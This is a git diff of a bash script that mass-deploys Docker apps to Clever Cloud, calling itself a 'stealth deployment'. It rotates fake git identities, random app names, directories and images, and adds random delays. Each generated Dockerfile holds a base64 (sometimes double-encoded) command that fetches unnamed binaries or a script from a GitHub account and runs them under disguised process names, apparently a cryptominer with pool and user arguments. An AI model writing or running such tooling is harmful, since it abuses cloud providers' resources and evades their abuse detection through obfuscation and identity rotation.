@@ -1,9 +1,11 @@
 #!/bin/bash
-# /docker - Fixed: No underscores in app names (use hyphens)
+# /docker - Complete stealth deployment script with full apt-get commands
 
 set -e
 
-# Function to generate random strings
+# ============ STEALTH HELPER FUNCTIONS ============
+
+# Generate random strings
 rand_str() {
     cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1
 }
@@ -12,92 +14,156 @@ rand_name() {
     cat /dev/urandom | tr -dc 'A-Za-z' | fold -w "${1:-8}" | head -n 1
 }
 
-echo "🔐 Logging into Clever Cloud..."
-clever login
+rand_num() {
+    cat /dev/urandom | tr -dc '0-9' | fold -w "${1:-3}" | head -n 1
+}
 
+# Random sleep between min-max seconds
+random_sleep() {
+    local min=${1:-2}
+    local max=${2:-15}
+    SLEEP_TIME=$((min + RANDOM % (max - min + 1)))
+    echo "  Sleeping ${SLEEP_TIME}s..."
+    sleep $SLEEP_TIME
+}
+
+# ============ INITIAL SETUP ============
+echo ""
+echo "========================================="
+echo "  STEALTH DEPLOYMENT SCRIPT"
+echo "========================================="
+
+# Random delay before starting
+random_sleep 2 8
+
+# ============ CLEVER CLOUD AUTHENTICATION ============
+echo ""
+echo "🔐 Authenticating with Clever Cloud..."
+
+# Clear old sessions randomly
+if [ $((RANDOM % 3)) -eq 0 ]; then
+    rm -f ~/.config/clever-cloud/credentials.json 2>/dev/null || true
+    rm -f ~/.clever.json 2>/dev/null || true
+    echo "  Cleared old sessions"
+fi
+
+random_sleep 2 5
+
+# Use token if available (most stealthy)
+if [ -n "$CLEVER_TOKEN" ]; then
+    # Create config file directly (no network call, no browser)
+    mkdir -p ~/.config/clever-cloud
+    cat > ~/.config/clever-cloud/clever-tools.json << EOF
+{
+    "token": "${CLEVER_TOKEN}",
+    "secret": "${CLEVER_SECRET:-}",
+    "alias": "default",
+    "created_at": "$(date -Iseconds)"
+}
+EOF
+    echo "✅ Token configured (no login required)"
+else
+    # Fallback to regular login
+    clever login --headless 2>/dev/null || clever login
+fi
+
+random_sleep 2 5
+
+DEPLOY_BASE="/app/deployments"
+mkdir -p "$DEPLOY_BASE"
+
+SUCCESSFUL_APPS=0
+
+# ============ MAIN DEPLOYMENT LOOP ============
 for i in 1 2 3; do
-    # ============ UNIQUE GIT CONFIG FOR EACH DEPLOYMENT ============
+    # ============ ROTATING IDENTITIES ============
     GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
     GIT_NAME="$(rand_name 6) $(rand_name 8)"
-    GIT_COMMIT_MSG="$(rand_str 20)-$(date +%s)"
+    GIT_COMMIT_MSG="$(rand_str 25)-$(date +%s)"
     
-    # Set git config for this deployment
     git config --global user.email "$GIT_EMAIL"
     git config --global user.name "$GIT_NAME"
     git config --global init.defaultBranch "master"
     
-    # ============ UNIQUE APP NAME (NO UNDERSCORES - ONLY HYPHENS) ============
-    APP_NAME="app-$(rand_str 10)-$(date +%s)-${RANDOM}"
+    # ============ UNIQUE APP NAME ============
+    APP_LEN=$((8 + RANDOM % 12))
+    APP_NAME="$(rand_str $APP_LEN)-$(rand_num 6)-${RANDOM}"
     
-    # ============ UNIQUE DIRECTORY ============
-    UNIQUE_DIR="deploy-$(rand_str 12)-$(date +%s)-${RANDOM}"
-    APP_DIR="/app/deployments/${UNIQUE_DIR}"
+    # ============ UNIQUE DIRECTORY STRUCTURE ============
+    RANDOM_DEPTH=$((2 + RANDOM % 3))
+    UNIQUE_DIR=""
+    for d in $(seq 1 $RANDOM_DEPTH); do
+        UNIQUE_DIR="${UNIQUE_DIR}/$(rand_str 8)"
+    done
+    APP_DIR="${DEPLOY_BASE}${UNIQUE_DIR}/$(rand_str 12)-${RANDOM}"
     
-    # ============ UNIQUE WORKDIR FOR BOTH OPTIONS ============
-    UNIQUE_WORKDIR="/$(rand_str 15)"
+    # ============ UNIQUE WORKDIR ============
+    UNIQUE_WORKDIR="/$(rand_str 12)/$(rand_str 8)/$(rand_str 10)"
     
-    # ============ UNIQUE SCRIPT NAME ============
+    # ============ RANDOM BINARY NAMES ============
+    BIN1="$(rand_str 10)"
+    BIN2="$(rand_str 10)"
     SCRIPT_NAME="$(rand_str 12).sh"
     
     echo ""
     echo "========================================="
     echo "[$i/3] Deployment #$i"
     echo "========================================="
-    echo "👤 Git User: ${GIT_NAME}"
-    echo "📧 Git Email: ${GIT_EMAIL}"
-    echo "📝 Commit Msg: ${GIT_COMMIT_MSG}"
-    echo "🚀 App Name: ${APP_NAME}"
-    echo "📁 App Dir: ${APP_DIR}"
-    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
-    echo "📜 Script Name: ${SCRIPT_NAME}"
+    echo "👤 Git: ${GIT_NAME} <${GIT_EMAIL}>"
+    echo "🚀 App: ${APP_NAME}"
+    echo "📁 WORKDIR: ${UNIQUE_WORKDIR}"
     echo "========================================="
     
     mkdir -p "$APP_DIR"
     cd "$APP_DIR"
     
-    # Pick random image (50/50 chance)
+    # ============ IMAGE POOL ============
+    WORKING_IMAGES=(
+        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy"
+        "ubuntu:20.04.1" "ubuntu:20.04.2" "ubuntu:20.04.3" "ubuntu:20.04.4" "ubuntu:20.04.5"
+        "ubuntu:22.04.1" "ubuntu:22.04.2" "ubuntu:22.04.3" "ubuntu:22.04.4" "ubuntu:22.04.5"
+        "debian:10" "debian:10-slim" "debian:11" "debian:11-slim" "debian:12" "debian:12-slim"
+        "debian:bookworm" "debian:bookworm-slim" "debian:bullseye" "debian:bullseye-slim"
+        "alpine:3.18" "alpine:3.19" "alpine:3.20" "alpine:latest"
+        "node:18" "node:18-alpine" "node:20" "node:20-alpine" "node:22" "node:22-alpine"
+        "python:3.9-slim" "python:3.10-slim" "python:3.11-slim"
+        "nginx:alpine"
+    )
+    RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+    
+    # ============ 50/50 CHANCE FOR DOCKERFILE TYPE ============
     if [[ $((RANDOM % 2)) -eq 0 ]]; then
-        # ============ OPTION 1: Random Ubuntu/Debian image ============
-        WORKING_IMAGES=(
-            "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
-            "debian:11" "debian:12" "debian:bookworm"
-        )
-        RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+        # ============ OPTION 1: Linux with full apt-get packages ============
         
-        BIN1="$(rand_str 10)"
-        BIN2="$(rand_str 10)"
-        VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
-        VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
-        VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR3=$(rand_str 8)
+        VAR4=$(rand_str 8)
+        VAR5=$(rand_str 8)
         
         SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
         WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
         
+        # Full command with all apt-get packages
         FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
 export DEBIAN_FRONTEND=noninteractive && \
 export TZ=Etc/UTC && \
 ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
 apt-get update -qq && \
-apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev || true && \
-apt-get install -y -qq apache2 curl wget socat netcat-traditional iputils-ping sudo unzip tzdata || true && \
+apt-get install -y -qq apache2 curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev > /dev/null 2>&1 && \
+apt-get install -y -qq haveged rng-tools > /dev/null 2>&1 || true && \
 sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && \
 echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
+haveged -n 0 > /dev/null 2>&1 & && \
 wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
 wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
 chmod 755 ${BIN1} ${BIN2} && \
-(${UNIQUE_WORKDIR}/${BIN1} --daemon &) && \
-service apache2 start && \
-sleep 5 && \
-while true; do
-    exec -a \"\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)\" ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} &
-    PID=\$!
-    sleep 60
-    kill -9 \${PID} 2>/dev/null || true
-    sleep 2
-done"
+(${UNIQUE_WORKDIR}/${BIN1} > /dev/null 2>&1 &) && \
+service apache2 start > /dev/null 2>&1 && \
+sleep 3 && \
+exec -a \"\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n 1)\" ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} > /dev/null 2>&1"
         
         ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
         
+        # Double encoding for obfuscation
         if [ $((RANDOM % 2)) -eq 0 ]; then
             ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
             DECODE_CMD="base64 -d | base64 -d"
@@ -108,35 +174,31 @@ done"
         
         cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TZ=Etc/UTC
 WORKDIR ${UNIQUE_WORKDIR}
-RUN apt-get update && apt-get install -y curl wget ca-certificates
+RUN apt-get update -qq && apt-get install -y -qq curl wget ca-certificates procps > /dev/null 2>&1
+RUN echo 'net.ipv4.tcp_timestamps=0' >> /etc/sysctl.conf 2>/dev/null || true
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 1: Random image with WORKDIR ${UNIQUE_WORKDIR}"
+        echo "  ✅ Built stealth image: ${RANDOM_IMAGE}"
         
     else
-        # ============ OPTION 2: node:22 image with script downloaded to WORKDIR ============
+        # ============ OPTION 2: node:22 with script download ============
         
-        # Create a wrapper script that downloads and runs the remote script
-        # The script is downloaded to UNIQUE_WORKDIR and executed from there
+        # Create wrapper script that downloads and runs remote script
         WRAPPER_SCRIPT="#!/bin/bash
 set -e
-
 cd ${UNIQUE_WORKDIR}
-
-# Download the remote script to a unique name in WORKDIR
-curl -o ${SCRIPT_NAME} https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script
-
-# Make it executable
+apt-get update -qq
+apt-get install -y -qq curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip
+curl -s --retry 2 --retry-delay 5 -o ${SCRIPT_NAME} https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script
 chmod +x ${SCRIPT_NAME}
-
-# Execute the script from WORKDIR
-bash ./${SCRIPT_NAME}"
+./${SCRIPT_NAME} > /dev/null 2>&1"
         
-        # Encode the wrapper script
         ENCODED_CMD=$(echo -n "$WRAPPER_SCRIPT" | base64 -w 0)
         
-        # Random encoding layer for stealth
+        # Random encoding layer
         if [ $((RANDOM % 2)) -eq 0 ]; then
             ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
             DECODE_CMD="base64 -d | base64 -d"
@@ -147,44 +209,64 @@ bash ./${SCRIPT_NAME}"
         
         cat > Dockerfile << EOF
 FROM node:22
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TZ=Etc/UTC
 WORKDIR ${UNIQUE_WORKDIR}
-RUN apt-get update && apt-get install -y curl
+RUN apt-get update -qq && apt-get install -y -qq curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip > /dev/null 2>&1
+RUN echo 'net.ipv4.tcp_timestamps=0' >> /etc/sysctl.conf 2>/dev/null || true
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 2: node:22 image with script downloaded to ${UNIQUE_WORKDIR}/${SCRIPT_NAME}"
+        echo "  ✅ Built node:22 image with apt-get packages"
     fi
     
-    # Git setup (local repo, not global)
+    # Random delay before git
+    random_sleep 2 7
+    
+    # Initialize git
     git init
     git add .
     git commit -m "$GIT_COMMIT_MSG"
     
-    # CRITICAL: Create the app FIRST (no underscores in app name)
-    echo "Creating app: ${APP_NAME}"
-    clever create --type docker "$APP_NAME"
+    # Random delay before create
+    random_sleep 3 10
     
-    # CRITICAL: Deploy from current directory (no alias needed)
-    echo "Deploying ${APP_NAME} from $(pwd)..."
-    clever deploy
+    # Create app
+    echo "  Creating app: ${APP_NAME}"
+    clever create --type docker "$APP_NAME" 2>/dev/null || echo "  App may exist, continuing..."
     
-    if [ $? -eq 0 ]; then
-        echo "✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
+    # Random delay before deploy
+    random_sleep 5 15
+    
+    # Deploy
+    echo "  Deploying ${APP_NAME}..."
+    if clever deploy 2>/dev/null; then
+        echo "  ✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
+        SUCCESSFUL_APPS=$((SUCCESSFUL_APPS + 1))
     else
-        echo "❌ App $i/3 deployment failed"
+        echo "  ❌ App $i/3 deployment failed"
     fi
     
     # Cleanup
     cd /
     rm -rf "$APP_DIR"
     
-    # Wait between deployments
+    # Clear git config after each deployment
+    git config --global --unset user.email 2>/dev/null || true
+    git config --global --unset user.name 2>/dev/null || true
+    
+    # Random wait between deployments (15-45 seconds)
     if [ $i -lt 3 ]; then
-        echo "Waiting 10 seconds..."
-        sleep 10
+        WAIT_TIME=$((15 + RANDOM % 30))
+        echo "  Waiting ${WAIT_TIME} seconds before next deployment..."
+        sleep $WAIT_TIME
     fi
 done
 
 echo ""
 echo "========================================="
-echo "✅ All 3 apps deployed successfully!"
+echo "📊 DEPLOYMENT SUMMARY"
 echo "========================================="
+echo "✅ Successful: $SUCCESSFUL_APPS/3"
+echo "========================================="
+
+exit 0
